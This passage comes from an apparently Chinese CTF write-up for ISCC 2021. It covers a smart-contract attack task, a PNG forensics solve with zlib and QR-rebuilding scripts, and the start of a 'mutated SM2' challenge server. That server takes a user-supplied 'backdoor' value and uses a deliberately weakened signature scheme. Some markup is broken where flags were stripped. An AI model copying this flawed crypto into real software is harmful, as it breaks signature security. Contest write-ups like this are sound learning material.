memory </span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ISCC&#123;xxxxx&#125;&quot;</span>;<br>&#125;<br>&#125;<br>请编写攻击合约，实现对 Victim 的攻击，获取 flag。<br></code></pre></td></tr></table></figure><p>合约地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://rinkeby.etherscan.io/address/0x68D28fE315E6A344029D42915Fbc7af4261AB833<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210506204015536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>16进制转字符串<br><img src="https://img-blog.csdnimg.cn/20210506204048675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>也可以直接点击Decompile ByteCode进行反编译<br><img src="https://img-blog.csdnimg.cn/20210526133856346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="检查一下"><a href="#检查一下" class="headerlink" title="检查一下"></a>检查一下</h3><blockquote><p>题目描述：你真的了解png文件的格式吗？</p></blockquote><p>用pngcheck检查一下图片，发现最后一个IDAT块异常<br><img src="https://img-blog.csdnimg.cn/20210517162639589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>010复制出来<br><img src="https://img-blog.csdnimg.cn/20210517162450658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用脚本解压zlib</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br>s = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">78 9C 5D 52 09 0E C0 20 0C FA 12 FC FF 73 CB 6A</span><br><span class="hljs-string">39 54 97 4C 7B 41 2B E4 2C 00 3C DF 7F 04 69 B3</span><br><span class="hljs-string">AC E7 CA D9 27 E4 37 1D 27 15 33 01 E3 91 75 AB</span><br><span class="hljs-string">9D F4 D7 29 F3 E2 AF 13 75 21 CC AC 69 3D BB C8</span><br><span class="hljs-string">0A 2F 8C E0 26 D0 25 F9 F4 62 A2 08 C5 0A A0 69</span><br><span class="hljs-string">90 35 0D 34 E1 39 8B 8B 2A 5D A0 CA DE B4 FE 23</span><br><span class="hljs-string">61 59 CB 60 3B EE DA 82 5E 2E 1E E2 46 15 D8 8D</span><br><span class="hljs-string">AE 46 33 54 95 23 8A AD 82 FD C0 F5 CC 86 2C 76</span><br><span class="hljs-string">69 1F 34 74 8D 5F 22 70 2B 86 8A CC FA 69 EA 6D</span><br><span class="hljs-string">A4 12 DC 99 A5 21 08 B9 27 5F F3 37 40 A4 8C AA</span><br><span class="hljs-string">E7 1A A5 BE F4 AB E2 A5 B3 68 21 23 C6 07 2E D4</span><br><span class="hljs-string">9F 5D E1 77 9E 9A</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>s = s.replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>b = <span class="hljs-built_in">bytes</span>.fromhex(s)<br>flag = zlib.decompress(b)<br>print(flag)<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bashbr></code></pre></td></tr></table></figure><p>直接binwalk图片，也能得到同样的结果<br><img src="https://img-blog.csdnimg.cn/20210518191058101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>一共841位，猜测是29*29的二维码，直接使用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>MAX = <span class="hljs-number">29</span><br>pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX, MAX))<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quotquot;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>[i] == <span class="hljs-string">&#x27;1&#x27;</span>):<br>            pic.putpixel([x,y],(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">else</span>:<br>            pic.putpixel([x,y],(<span class="hljs-number">841</span>,<span class="hljs-number">841</span>,<span class="hljs-number">841</span>))<br>        i = i+<span class="hljs-number">1</span><br>pic.show()<br>pic.save(<span class="hljs-string">&quot;flag.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>扫码得到flag</p><h3 id="变异的SM2"><a href="#变异的SM2" class="headerlink" title="变异的SM2"></a>变异的SM2</h3><p>附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#server.py</span><br><span class="hljs-keyword">from</span> gmssl <span class="hljs-keyword">import</span> func, sm2<br><span class="hljs-comment"># from flag import FLAG</span><br>FLAG=<span class="hljs-string">&quot;&#123;testFlag&#125;&quot;</span><br><br>sm2p256v1_ecc_table = &#123;<br>    <span class="hljs-string">&#x27;n&#x27;</span>: <span class="hljs-string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123&#x27;</span>,<br>    <span class="hljs-string">&#x27;p&#x27;</span>: <span class="hljs-string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF&#x27;</span>,<br>    <span class="hljs-string">&#x27;g&#x27;</span>: <span class="hljs-string">&#x27;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7&#x27;</span> +<br>         <span class="hljs-string">&#x27;bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0&#x27;</span>,<br>    <span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC&#x27;</span>,<br>    <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-string">&#x27;28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93&#x27;</span>,<br>&#125;<br>n = <span class="hljs-string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123&#x27;</span><br>G = <span class="hljs-string">&#x27;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7&#x27;</span> \<br>    <span class="hljs-string">&#x27;bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sign</span>(<span class="hljs-params">tsm2</span>):</span><br>    data = func.random_hex(<span class="hljs-built_in">len</span>(n)) <br>    k1_str = func.random_hex(<span class="hljs-built_in">len</span>(n))<br>    print(tsm2.send_p1(data, k1_str))<br>    backdoor = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;backdoor:&#x27;</span>).strip()<br>    result = tsm2.output_p1(k1_str, backdoor)<br>    print(result)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">verify</span>(<span class="hljs-params">tsm2</span>):</span><br>    message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;msg:&#x27;</span>).strip().encode().strip(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    sign = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;sign:&#x27;</span>).strip().encode().strip(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    check = tsm2.verify(sign, message)<br>    <span class="hljs-keyword">if</span> check <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span> <span class="hljs-keyword">and</span> message == <span class="hljs-string">b&#x27;Hello, Welcome to ISCC2021!&#x27;</span>:<br>        print(FLAG)<br>    <span class="hljs-keyword">else</span>:<br>        print(check)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TSM2</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, sk</span>):</span><br>        ecc_table = sm2p256v1_ecc_table<br>        self.ecc_table = ecc_table<br>        self.n = <span class="hljs-built_in">int</span>(ecc_table[<span class="hljs-string">&#x27;n&#x27;</span>], <span class="hljs-number">16</span>)<br>        self.para_len = <span class="hljs-built_in">len</span>(ecc_table[<span class="hljs-string">&#x27;n&#x27;</span>])<br>        self.ecc_a3 = (<span class="hljs-built_in">int</span>(ecc_table[<span class="hljs-string">&#x27;a&#x27;</span>], base=<span class="hljs-number">16</span>) + <span class="hljs-number">3</span>) % <span class="hljs-built_in">int</span>(ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br><br>        self.sk = <span class="hljs-built_in">int</span>(sk, <span class="hljs-number">16</span>)<br>        self.pk = self._kg(self.sk, ecc_table[<span class="hljs-string">&#x27;g&#x27;</span>])<br>        <br>        self.sks = <span class="hljs-built_in">int</span>(func.random_hex(self.para_len), <span class="hljs-number">16</span>)<br>        self.pks = <span class="hljs-built_in">pow</span>((self.sk + <span class="hljs-number">1</span>) * self.sks, self.n - <span class="hljs-number">2</span>, self.n) % self.n<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_p1</span>(<span class="hljs-params">self, data, k1_str</span>):</span><br>        e = <span class="hljs-built_in">int</span>(data, <span class="hljs-number">16</span>)<br>        k1 = <span class="hljs-built_in">int</span>(k1_str, <span class="hljs-number">16</span>)<br>        k1 = k1 % self.n<br>        R1 = self._kg(k1, self.ecc_table[<span class="hljs-string">&#x27;g&#x27;</span>]) <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;%064x%0128s&#x27;</span> % (e, R1) <br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">output_p1</span>(<span class="hljs-params">self, k1_str, r_s2_s3</span>):</span><br>        r = <span class="hljs-built_in">int</span>(r_s2_s3[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>        s2 = <span class="hljs-built_in">int</span>(r_s2_s3[self.para_len:<span class="hljs-number">2</span> * self.para_len], <span class="hljs-number">16</span>)<br>        s3 = <span class="hljs-built_in">int</span>(r_s2_s3[<span class="hljs-number">2</span> * self.para_len:], <span class="hljs-number">16</span>)<br><br>        k1 = <span class="hljs-built_in">int</span>(k1_str, <span class="hljs-number">16</span>)<br>        d1 = self.sks<br>        s = (d1 * k1 * s2 + d1 * s3 - r) % self.n <br>        <span class="hljs-keyword">if</span> s == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> s == (self.n - r):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;%064x%064x&#x27;</span> % (r, s)  <br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">verify</span>(<span class="hljs-params">self, Sign, data</span>):</span><br>        r = <span class="hljs-built_in">int</span>(Sign[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>        s = <span class="hljs-built_in">int</span>(Sign[self.para_len:<span class="hljs-number">2</span> * self.para_len], <span class="hljs-number">16</span>)<br>        e = <span class="hljs-built_in">int</span>(data.<span class="hljs-built_in">hex</span>(), <span class="hljs-number">16</span>)<br>        t = (r + s) % self.n<br>        <span class="hljs-keyword">if</span> t == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>        P1 = self._kg(s, self.ecc_table[<span class="hljs-string">&#x27;g&#x27;</span>])<br>        P2 = self._kg(t, self.pk)<br><br>        <span class="hljs-keyword">if</span> P1 == P2:<br>            P1 = <span class="hljs-string">&#x27;%s%s&#x27;</span> % (P1, <span class="hljs-number">1</span>)<br>            P1 = self._double_point(P1)<br>        <span class="hljs-keyword">else</span>:<br>            P1 = <span class="hljs-string">&#x27;%s%s&#x27;</span> % (P1, <span class="hljs-number">1</span>)<br>            P1 = self._add_point(P1, P2)<br>            P1 = self._convert_jacb_to_nor(P1)<br><br>        x = <span class="hljs-built_in">int</span>(P1[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">return</span> r == ((e + x) % self.n)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_kg</span>(<span class="hljs-params">self, k, Point</span>):</span> <br>        <span class="hljs-keyword">if</span> (k % self.n) == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0&#x27;</span> * <span class="hljs-number">128</span><br>        Point = <span class="hljs-string">&#x27;%s%s&#x27;</span> % (Point, <span class="hljs-string">&#x27;1&#x27;</span>)<br>        mask_str = <span class="hljs-string">&#x27;8&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.para_len - <span class="hljs-number">1</span>):<br>            mask_str += <span class="hljs-string">&#x27;0&#x27;</span><br>        mask = <span class="hljs-built_in">int</span>(mask_str, <span class="hljs-number">16</span>)<br>        Temp = Point<br>        flag = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.para_len * <span class="hljs-number">4</span>):<br>            <span class="hljs-keyword">if</span> flag:<br>                Temp = self._double_point(Temp)<br>            <span class="hljs-keyword">if</span> (k &amp; mask) != <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span> flag:<br>                    Temp = self._add_point(Temp, Point)<br>                <span class="hljs-keyword">else</span>:<br>                    flag = <span class="hljs-literal">True</span><br>                    Temp = Point<br>            k = k &lt;&lt; <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> self._convert_jacb_to_nor(Temp)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_double_point</span>(<span class="hljs-params">self, Point</span>):</span> <br>        l = <span class="hljs-built_in">len</span>(Point)<br>        len_2 = <span class="hljs-number">2</span> * self.para_len<br>        <span class="hljs-keyword">if</span> l &lt; self.para_len * <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">else</span>:<br>            x1 = <span class="hljs-built_in">int</span>(Point[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>            y1 = <span class="hljs-built_in">int</span>(Point[self.para_len:len_2], <span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">if</span> l == len_2:<br>                z1 = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                z1 = <span class="hljs-built_in">int</span>(Point[len_2:], <span class="hljs-number">16</span>)<br><br>            T6 = (z1 * z1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (y1 * y1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (x1 + T6) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T4 = (x1 - T6) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T3 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (y1 * z1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T4 = (T2 * <span class="hljs-number">8</span>) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T5 = (x1 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T1 * <span class="hljs-number">3</span>) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T6 = (T6 * T6) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T6 = (self.ecc_a3 * T6) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T1 + T6) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            z3 = (T3 + T3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (T1 * T1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (T2 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            x3 = (T3 - T5) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br><br>            <span class="hljs-keyword">if</span> (T5 % <span class="hljs-number">2</span>) == <span class="hljs-number">1</span>:<br>                T4 = (T5 + ((T5 + <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)) &gt;&gt; <span class="hljs-number">1</span>) - T3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">else</span>:<br>                T4 = (T5 + (T5 &gt;&gt; <span class="hljs-number">1</span>) - T3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br><br>            T1 = (T1 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            y3 = (T1 - T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br><br>            form = <span class="hljs-string">&#x27;%%0%dx&#x27;</span> % self.para_len<br>            form = form * <span class="hljs-number">3</span><br>            <span class="hljs-keyword">return</span> form % (x3, y3, z3)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_add_point</span>(<span class="hljs-params">self, P1, P2</span>):</span> <br>        <span class="hljs-keyword">if</span> P1 == <span class="hljs-string">&#x27;0&#x27;</span> * <span class="hljs-number">128</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;%s%s&#x27;</span> % (P2, <span class="hljs-string">&#x27;1&#x27;</span>)<br>        <span class="hljs-keyword">if</span> P2 == <span class="hljs-string">&#x27;0&#x27;</span> * <span class="hljs-number">128</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;%s%s&#x27;</span> % (P1, <span class="hljs-string">&#x27;1&#x27;</span>)<br>        len_2 = <span class="hljs-number">2</span> * self.para_len<br>        l1 = <span class="hljs-built_in">len</span>(P1)<br>        l2 = <span class="hljs-built_in">len</span>(P2)<br>        <span class="hljs-keyword">if</span> (l1 &lt; len_2) <span class="hljs-keyword">or</span> (l2 &lt; len_2):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">else</span>:<br>            X1 = <span class="hljs-built_in">int</span>(P1[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>            Y1 = <span class="hljs-built_in">int</span>(P1[self.para_len:len_2], <span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">if</span> l1 == len_2:<br>                Z1 = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                Z1 = <span class="hljs-built_in">int</span>(P1[len_2:], <span class="hljs-number">16</span>)<br>            x2 = <span class="hljs-built_in">int</span>(P2[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>            y2 = <span class="hljs-built_in">int</span>(P2[self.para_len:len_2], <span class="hljs-number">16</span>)<br><br>            T1 = (Z1 * Z1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (y2 * Z1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (x2 * T1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T1 * T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (T3 - X1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (T3 + X1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T4 = (T2 * T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T1 - Y1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            Z3 = (Z1 * T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (T2 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (T3 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span 